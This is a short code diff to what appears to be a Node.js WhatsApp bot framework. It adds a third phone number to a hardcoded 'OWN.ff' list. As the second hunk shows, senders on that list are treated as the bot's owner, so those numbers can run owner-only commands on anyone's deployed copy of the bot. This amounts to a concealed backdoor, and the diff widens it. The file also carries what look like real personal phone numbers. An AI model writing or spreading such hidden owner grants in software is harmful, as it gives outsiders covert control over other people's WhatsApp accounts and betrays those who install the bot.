@@ -54,7 +54,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94785435462,94785457519' }
+var OWN = { ff: '94785435462,94785457519,94711031915' }
 
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -479,7 +479,7 @@ ${chalk.blue.italic('🇱🇰 Try To Login WhatsApp... Please Wait...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "94785435462,94785457519" && msh.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94785435462,94785457519,94711031915" && msh.key.fromMe === false && command.fromMe === true &&
                         (msh.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msh.participant.split('@')[0]) : msh.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msh.key.remoteJid.split('@')[0]) : msh.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msh.key.fromMe || (command.fromMe === false && !msh.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
